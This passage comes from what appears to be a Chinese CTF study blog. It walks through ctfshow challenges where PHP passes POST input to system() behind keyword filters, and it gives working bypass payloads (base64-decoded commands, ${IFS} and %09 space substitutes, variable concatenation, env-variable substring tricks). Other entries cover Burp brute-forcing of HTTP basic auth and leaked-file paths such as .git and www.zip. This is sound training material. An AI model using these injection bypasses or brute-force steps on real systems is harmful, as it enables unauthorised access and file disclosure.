1.txt<br>再访问1.txt就可以看到回显</li><li>将回显移动到我们可以访问的地方<br>mv flag.ph? 1.txt<br>再访问1.txt就可以看到回显</li><li>还有其他多种方法不再一一赘述</li></ul><h4 id="ctfshow私教课web10（有通杀）"><a href="#ctfshow私教课web10（有通杀）" class="headerlink" title="ctfshow私教课web10（有通杀）"></a>ctfshow私教课web10（有通杀）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\&amp;|\;|cat|tac|nl|more|od/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);   &#125;     </span><br><span class="line"> <span class="meta">?&gt;</span>   </span><br></pre></td></tr></table></figure><p>第一种方法是用不了了，后两种可以继续使用</p><ul><li>将回显复制到文本中<br>cp fla？.php 1.txt<br>再访问1.txt就可以看到回显</li><li>将回显移动到我们可以访问的地方<br>mv fla？.php 1.txt<br>再访问1.txt就可以看到回显</li></ul><p>这是之前的方法，还有一种通杀方法</p><ul><li>cmd&#x3D;<code>echo &#39;dGFjIGZsYWcucGhw&#39;|base64 -d</code>||<br>这里的dGFjIGZsYWcucGhw是bas64编码后的tac flag.php<br>利用编码解码进行绕过，拿到flag</li></ul><h4 id="ctfshow私教课web11"><a href="#ctfshow私教课web11" class="headerlink" title="ctfshow私教课web11"></a>ctfshow私教课web11</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\&amp;|\;| /i&quot;</span>,<span class="variable">$cmd</span>))&#123;   <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里过滤了空格，需要对空格进行绕过</p><ul><li>通杀解在这里仍旧有效<br>cmd&#x3D;<code>echo$&#123;IFS&#125;&#39;dGFjIGZsYWcucGhw&#39;|base64$&#123;IFS&#125;-d</code></li><li>cmd&#x3D;tac${IFS}fla?.php</li><li>cmd&#x3D;cp${IFS}fla?.php${IFS}1.txt</li><li>cmd&#x3D;mv${IFS}fla?.php${IFS}1.txt</li><li>还有其他方法不再一一赘述</li></ul><h4 id="变量拼接绕过关键字"><a href="#变量拼接绕过关键字" class="headerlink" title="变量拼接绕过关键字"></a>变量拼接绕过关键字</h4><p>a&#x3D;c;b&#x3D;at;c&#x3D;fla;d&#x3D;g.php;$a$b $c$d<br>等效为cat flag.php</p><h3 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h3><ul><li>当空格被过滤了时，可以使用以下几个进行替换</li></ul><ol><li>读文件时，可以使用&lt;&gt;</li><li>${IFS}  $IFS$9</li><li>%09 %0b %0c</li><li>字符串截取空格</li></ol><h4 id="字符串截取空格"><a href="#字符串截取空格" class="headerlink" title="字符串截取空格"></a>字符串截取空格</h4><p>例如<br>1.ctfshow&#x3D;aabbcc<br>2.${ctfshow}<br>3.这里输出的就是aabbcc</p><p>1.ctfshow&#x3D;aabbcc<br>2.${ctfshow:2}<br>3.这里输出的就是bbcc</p><p>1.ctfshow&#x3D;aabbcc<br>2.${ctfshow:4:1}<br>3.这里输出的就是c</p><p>我们可以通过这个在系统中找已经定义好的变量，然后截取里面的字符串即可</p><h4 id="ctfshow私教课web12"><a href="#ctfshow私教课web12" class="headerlink" title="ctfshow私教课web12"></a>ctfshow私教课web12</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>      </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];         </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\&amp;|\;| |IFS|\&gt;|\&lt;|\x09/i&quot;</span>,<span class="variable">$cmd</span>))&#123;   </span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用常见的能够替代空格的字符，发现没用，使用爆破后也没有找到能够替代空格的字符<br> 接下来我们就要考虑使用字符串截断</p><blockquote><p>输入cmd&#x3D;env查看环境变量<br> <img src="/img/jiequ0.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>查看网页源代码，找一下那个环境变量含有空格<img src="/img/jiequ2.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>再使用上面的字符串截取格式，来代替空格<img src="/img/jiequ3.jpg" alt="输入图片说明"></p></blockquote><p>这样就可以正确进行空格绕过，拿到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爆破找代替空格的字符</title>
      <link href="/2025/01/12/%E7%88%86%E7%A0%B4%E6%89%BE%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6/"/>
      <url>/2025/01/12/%E7%88%86%E7%A0%B4%E6%89%BE%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%AD%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="通过爆破找到能够替代空格的字符"><a href="#通过爆破找到能够替代空格的字符" class="headerlink" title="通过爆破找到能够替代空格的字符"></a>通过爆破找到能够替代空格的字符</h1><h3 id="例题为ctfshow私教课web11"><a href="#例题为ctfshow私教课web11" class="headerlink" title="例题为ctfshow私教课web11"></a>例题为ctfshow私教课web11</h3><p><img src="/img/baopo2.jpg" alt="输入图片说明"></p><p>这道题可以使用常见的${IFS},$IFS$1等进行绕过，也可以同爆破来找到合适的字符替代空格，下面是操作方法</p><p>首先进行正常的抓包<br>cmd&#x3D;tac1fla?.php</p><p>在1处注入payload</p><p>注意：将整数最小位数改为2<br>添加前缀%<br>将最下方的进行URL编码关掉</p><p>进行爆破就可以找到我们的目标字符</p><p><img src="/img/baopo1.jpg" alt="输入图片说明"></p><p><img src="/img/baopo0.jpg" alt="输入图片说明"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>本地抓包</title>
      <link href="/2025/01/12/%E6%9C%AC%E5%9C%B0%E6%8A%93%E5%8C%85/"/>
      <url>/2025/01/12/%E6%9C%AC%E5%9C%B0%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="如何抓本地包"><a href="#如何抓本地包" class="headerlink" title="如何抓本地包"></a>如何抓本地包</h1><h3 id="首先打开命令指示符"><a href="#首先打开命令指示符" class="headerlink" title="首先打开命令指示符"></a>首先打开命令指示符</h3><p>输入 ipconfig</p><p><img src="/img/1.jpg" alt="输入图片说明"></p><h3 id="然后找到这个IPV4地址"><a href="#然后找到这个IPV4地址" class="headerlink" title="然后找到这个IPV4地址"></a>然后找到这个IPV4地址</h3><p><img src="/img/2.jpg" alt="输入图片说明"></p><h3 id="将网址什么的都改成这个网址"><a href="#将网址什么的都改成这个网址" class="headerlink" title="将网址什么的都改成这个网址"></a>将网址什么的都改成这个网址</h3><p><img src="/img/3.jpg" alt="输入图片说明"></p><p>就可以抓包成功。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爆破http认证</title>
      <link href="/2025/01/11/%E7%88%86%E7%A0%B4http%E8%AE%A4%E8%AF%81/"/>
      <url>/2025/01/11/%E7%88%86%E7%A0%B4http%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="爆破http认证"><a href="#爆破http认证" class="headerlink" title="爆破http认证"></a>爆破http认证</h1><h2 id="例题为ctfshow私教课web5"><a href="#例题为ctfshow私教课web5" class="headerlink" title="例题为ctfshow私教课web5"></a>例题为ctfshow私教课web5</h2><p>所谓http认证，就是通过服务器端发回一个标志，告诉服务器，这个页面需要用户输入用户名和密码才能访问，浏览器会自动弹出一个输入框，让输入用户名和密码，如果正确则继续访问，如果错误则报401未授权</p><p>ctfshow私教课web5</p><p><img src="/img/2025-01-11/crack1.jpg" alt="输入图片说明"></p><p>类似于这种操作页面</p><h3 id="首先输入一个账号密码用BP进行抓包"><a href="#首先输入一个账号密码用BP进行抓包" class="headerlink" title="首先输入一个账号密码用BP进行抓包"></a>首先输入一个账号密码用BP进行抓包<img src="/img/2025-01-11/crack3.jpg" alt="输入图片说明"></h3><p>我们是无法直接看到账号密码的，但是可以看到这一串经过base64加密后的账号密码，复制粘贴投入右上角的编码工具</p><p>经过base64解码后，我们可以得到<br>admin:admin<br>这就是我们输入的账号密码<br><img src="/img/2025-01-11/crack4.jpg" alt="插入图片说明"></p><p>进行爆破</p><h3 id="需要添加前缀"><a href="#需要添加前缀" class="headerlink" title="需要添加前缀"></a>需要添加前缀</h3><p>账号在这道题规定是admin，我们首先需要根据前面得到的格式进行添加前缀</p><p><img src="/img/2025-01-11/crack5.jpg" alt="输入图片说明"></p><h3 id="添加base64编码"><a href="#添加base64编码" class="headerlink" title="添加base64编码"></a>添加base64编码</h3><p><img src="/img/2025-01-11/crack6.jpg" alt="输入图片说明"></p><h3 id="注意这里需要关掉下面的URL编码字符"><a href="#注意这里需要关掉下面的URL编码字符" class="headerlink" title="注意这里需要关掉下面的URL编码字符"></a>注意这里需要关掉下面的URL编码字符</h3><p><img src="/img/2025-01-11/crack7.jpg" alt="输入图片说明"></p><h3 id="进行爆破就可以得到我们需要的经过后base64编码的账号密码，我们进行解码后，登陆就能拿到flag"><a href="#进行爆破就可以得到我们需要的经过后base64编码的账号密码，我们进行解码后，登陆就能拿到flag" class="headerlink" title="进行爆破就可以得到我们需要的经过后base64编码的账号密码，我们进行解码后，登陆就能拿到flag"></a>进行爆破就可以得到我们需要的经过后base64编码的账号密码，我们进行解码后，登陆就能拿到flag</h3><p><img src="/img/2025-01-11/crack9.jpg" alt="输入图片说明"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集知识</title>
      <link href="/2025/01/10/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9F%A5%E8%AF%86/"/>
      <url>/2025/01/10/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ctfshow第一课"><a href="#ctfshow第一课" class="headerlink" title="ctfshow第一课"></a>ctfshow第一课</h1><h2 id="信息泄漏的类型"><a href="#信息泄漏的类型" class="headerlink" title="信息泄漏的类型"></a>信息泄漏的类型</h2><h3 id="1-版本软件信息泄露"><a href="#1-版本软件信息泄露" class="headerlink" title="1.版本软件信息泄露"></a>1.版本软件信息泄露</h3><ul><li>.git</li><li>svn</li><li>.hg</li><li>.bzr</li><li>CVS</li></ul><h3 id="2-敏感文件信息泄露"><a href="#2-敏感文件信息泄露" class="headerlink" title="2.敏感文件信息泄露"></a>2.敏感文件信息泄露</h3><ul><li>robots.txt</li><li><a href="http://www.zip/">www.zip</a></li><li>静态文件注释泄露</li></ul><h3 id="3-配置错误信息泄露"><a href="#3-配置错误信息泄露" class="headerlink" title="3.配置错误信息泄露"></a>3.配置错误信息泄露</h3><ul><li>DS_Store</li><li>WEB-INF</li><li>Apache&#x2F;nginx 错误配置</li></ul><p>&#x3D;&#x3D;不管白猫黑猫，抓住老鼠就是好猫&#x3D;&#x3D;</p><p>&#x2F;admin&#x2F;  访问的是admin目录<br>&#x2F;admn     访问的是admin文件<br>&#x2F;user        访问的是这个路由</p><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><ul><li>200 表示正常</li><li>301 302 表示跳转</li><li>404 表示文件不存在</li><li>500 表示服务器内部错误</li><li>502 表示转发失败 error getwary</li></ul><h4 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h4><p>机器人协议，又称为爬虫协议，防君子不防小人，能看到他不想让你访问的网址</p><h4 id="git"><a href="#git" class="headerlink" title=".git"></a>.git</h4><p>这个泄露使用GitHack就可以查看到泄漏的内容</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
